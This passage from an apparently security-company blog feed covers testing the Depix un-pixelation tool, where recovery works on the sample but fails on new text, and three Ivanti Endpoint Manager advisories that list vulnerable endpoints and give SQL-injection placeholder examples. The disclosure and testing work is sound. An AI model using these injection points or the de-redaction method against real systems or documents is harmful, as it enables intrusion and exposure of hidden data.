      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The command specifies the Path to the Pixelated Image (-p), Path to the Search Image (-s) and Path to Output (-o). &lt;/p&gt;
&lt;p&gt;If &lt;strong&gt;sublime&lt;/strong&gt; text editor is used and pixelated with &lt;strong&gt;Gimp&lt;/strong&gt;, this command is used: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sublime_screenshot_pixels_gimp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruin_sublime_Linux_small&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backgroundcolor&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;averagetype&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linear&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;em&gt;backgroundcolour&lt;/em&gt; option filters out the coloured background of the editor and specifies the linear &lt;em&gt;averagetype&lt;/em&gt; as that’s the default averaging within Gimp. &lt;/p&gt;
&lt;h3&gt;3.3.1 Example&lt;span class=&#34;absolute -mt-20&#34; id=&#34;331-example&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#331-example&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This &lt;strong&gt;example&lt;/strong&gt; leverages the first instance of Notepad &amp;amp; Greenshot. &lt;/p&gt;
&lt;p&gt;In the image below, we see that depix begins brute forcing the images for a match.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Remember, it isn’t actually attacking the &lt;strong&gt;pixelated image&lt;/strong&gt;. Rather, it leverages the De Bruijn image (with all the printable characters) to generate combinations of letters that can be pixelated to match the &lt;strong&gt;obfuscated image.&lt;/strong&gt; &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase646a8a043faedc72c4.png&#34; alt=&#34;pngbase646a8a043faedc72c4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Depending on the size of the redacted image this can take a while. We used the author’s original, example image. As this was the ‘ideal’ condition to operate under, the brute force took around 60-90 seconds to complete! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase64195247c857a273c2.png&#34; alt=&#34;pngbase64195247c857a273c2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.4 Results&lt;/strong&gt; &lt;span class=&#34;absolute -mt-20&#34; id=&#34;34-results&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#34-results&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This was the censored file we tested against - not a very pretty sight, but very redacted nonetheless. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-2.png&#34; alt=&#34;unnamed 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This obfuscated image was fed into &lt;strong&gt;Depix.&lt;/strong&gt; These are the results from the brute force.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-1-1.png&#34; alt=&#34;unnamed 1 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Although the results aren’t perfect. We are still able to interpret the results. For reference, the original message said, “&lt;em&gt;Hello from the other side.”&lt;/em&gt; &lt;/p&gt;
&lt;p&gt;Not bad. &lt;em&gt;It’s pretty good&lt;/em&gt;&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-2-1.png&#34; alt=&#34;unnamed 2 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;We&amp;rsquo;re 10 layers deep in meme culture with this one&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h1&gt;&lt;strong&gt;4. Re-creating the test&lt;/strong&gt; &lt;/h1&gt;&lt;p&gt;In our example we were operating under &lt;strong&gt;ideal conditions.&lt;/strong&gt; As we know, in the real world, nefarious activities hardly ever take place under ideal conditions!&lt;/p&gt;
&lt;p&gt;Let’s &lt;strong&gt;recreate the experiment&lt;/strong&gt;. This time, it will be original content, not the author’s supplied example: &lt;strong&gt;we’ll create our own text, obfuscate it, and try to brute force it.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;4.1 Setup part two&lt;span class=&#34;absolute -mt-20&#34; id=&#34;41-setup-part-two&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#41-setup-part-two&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We opened &lt;strong&gt;Notepad&lt;/strong&gt; on our Windows machine. We added the shameless plug text we wanted to redact:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0.png&#34; alt=&#34;pasted image 0&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In order to &lt;strong&gt;pixelate&lt;/strong&gt; this text, I used Depix’s example obfuscator: &lt;strong&gt;genpixed.py&lt;/strong&gt; I was able to redact the text inside the image. Greenshot would be useful if only key words were redacted but to show it’s capability I redacted the whole thing: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;genpixed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PNG&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PNG&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;with -i being the input image and -o being the output image.&lt;/p&gt;
&lt;h2&gt;4.2  A disappointing recovery&lt;span class=&#34;absolute -mt-20&#34; id=&#34;42-a-disappointing-recovery&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#42-a-disappointing-recovery&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To then &lt;strong&gt;recover&lt;/strong&gt; this &lt;strong&gt;obfuscated&lt;/strong&gt; text, we ran this big old one-liner:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruinseq_notepad_Windows10_closeAndSpace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After around &lt;strong&gt;45/50 minutes&lt;/strong&gt;, Depix finally had a returned output… unfortunately it &lt;strong&gt;failed to&lt;/strong&gt; &lt;strong&gt;recover the pixelated text.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-3.png&#34; alt=&#34;unnamed 3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We wondered if this was due to the length of the text we offered Depix. So we re-created this experiment with &amp;ldquo;Hello World&amp;rdquo;. The results still did not yield success.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;images/hi-1.png&#34; alt=&#34;hi 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;images/bi.png&#34; alt=&#34;bi&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This could be due to a number of reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Minor issues in the pixel layout&lt;/li&gt;
&lt;li&gt;The character font is different&lt;/li&gt;
&lt;li&gt;A faulty De Bruijn image is leveraged for the dictionary attack&lt;/li&gt;
&lt;li&gt;Or good old human error&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Regardless, one or more of these issues frustrated Depix and it failed to depixelate our original content. &lt;strong&gt;Whereas I’m sure it has a strong potential in the future, It currently has a  limited scope of what it can return.&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;5. Reviewing Depix&lt;/h1&gt;&lt;p&gt;Depix’s python program was straightforward to use. Under the ideal demo example conditions, the results were impressive considering how pixelated the sample was beforehand. But it wasn’t perfect and failed to work for our real-life original content, though we gave some reasons why that could be the case.&lt;/p&gt;
&lt;p&gt;In addition, Depix isn’t the answer to deobfuscating all pixelated text. There are only a couple of situations where it works. If the pixelation scale or cell size was different, the results would return nothing. If the pixelation was done with a tool other than the supported ones, it simply does not work. Moreover, you’d have to arbitrarily know or guess the specific tools used and hope that the Depix tool would work at de-obfuscating them. In the author’s Github, they recognise this current limitation. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;The Depix tool poses minimal risk to security at present, as it requires specific criteria to be met to be effective.&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For now, however, there is a small chance that users can depixelate images, so it’s recommended to use a &lt;strong&gt;full box at full opacity&lt;/strong&gt; to redact files. &lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_16-25.png&#34; alt=&#34;2021 07 27 16 25&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;You can pick a less offensive colour of course&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h1&gt;&lt;strong&gt;5. Challenge&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;If you fancy having a go at this yourself, and your GPU is beefy enough for the Herculean challenge, we’d love for you to have a go at de-obfuscating this image. If you crack the code, @ us on Twitter and we’ll &lt;strong&gt;organise for something interesting to be delivered to you&lt;/strong&gt;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/memes.png&#34; alt=&#34;memes&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If you do use Depix (even outside of our challenge), we would be interested to hear about your experience. &lt;strong&gt;Let us know on twitter:&lt;/strong&gt; &lt;a href=&#34;https://twitter.com/jumpseclabs?lang=en&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;@JumpsecLabs&lt;/strong&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Caleb Herbert&lt;/strong&gt; is a Red Team Researcher @ JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13769 – Ivanti Unified Endpoint Manager SQL injection</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13769&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 7.4 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;A number of web components in Endpoint Manager do not properly sanitize user input when executing SQL queries, leaving the application vulnerable to injection attacks towards the underlying database.&lt;br&gt;
On a standard installation with default options, the account used to query the database is database administrator.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also reported this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameters are vulnerable and exploitable by any authenticated user:&lt;/p&gt;
&lt;p&gt;POST /LDMS/alert_log.aspx?d=alert_log&amp;amp;tb=serverAlertLog.tb&lt;br&gt;
&amp;ldquo;filterValue&amp;rdquo; parameter&lt;br&gt;
Type: Stacked, time-based blind, boolean-based blind&lt;br&gt;
Example: filterValue=&amp;rsquo;;injection_query_here&amp;ndash;&lt;/p&gt;
&lt;p&gt;POST /remotecontrolauth/api/device&lt;br&gt;
&amp;ldquo;global&amp;rdquo;, &amp;ldquo;displayname&amp;rdquo;, &amp;ldquo;ipaddress&amp;rdquo;, &amp;ldquo;owner&amp;rdquo; parameters&lt;br&gt;
Type: Time-based blind, boolean-based blind&lt;br&gt;
Example: &amp;ldquo;global&amp;rdquo;:&amp;quot;&amp;rsquo;+(injection_query_here)+&amp;rsquo;&amp;quot;&lt;br&gt;
This instance also requires a valid &amp;ldquo;sessionid&amp;rdquo; in the request.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13772 - Ivanti Unified Endpoint Manager system information disclosure</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13772&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.3 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, unauthenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Ivanti Unified Endpoint Manager&amp;rsquo;s &amp;ldquo;ldcient&amp;rdquo; component expose information about the system that could be used in further attacks against the system.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity. If possible, consider disabling or whitelisting access to the affected URLs.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoint expose information about the system, such as environment variables, domain name, internal paths and CPU information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTP 9595&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9594&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9593&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13773 - Ivanti Unified Endpoint Manager Reflected XSS</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13773&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.5 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Various web pages on Ivanti Unified Endpoint Manager web management console lack proper input validation on parameters passed in HTTP request, leaving the application vulnerable to client-side attacks. An attacker able to cause the victim to open a malicious URL would obtain javascript code execution on the victim&amp;rsquo;s browser and potentially be able to obtain sensitive information and execute actions on their behalf.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameter are vulnerable:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;top&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;ttb&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;splittf&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/licensecheck.aspx &amp;ldquo;doc&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitcollapse.aspx &amp;ldquo;bottom&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortcol&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/ServerList.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_coremainfrm.aspx &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_findfrm.aspx &amp;ldquo;m&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_taskfrm.aspx any parameter&lt;/li&gt;
&lt;li&gt;/LDMS/query_browsecomp.aspx &amp;ldquo;t&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;d&amp;rdquo; parameter&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
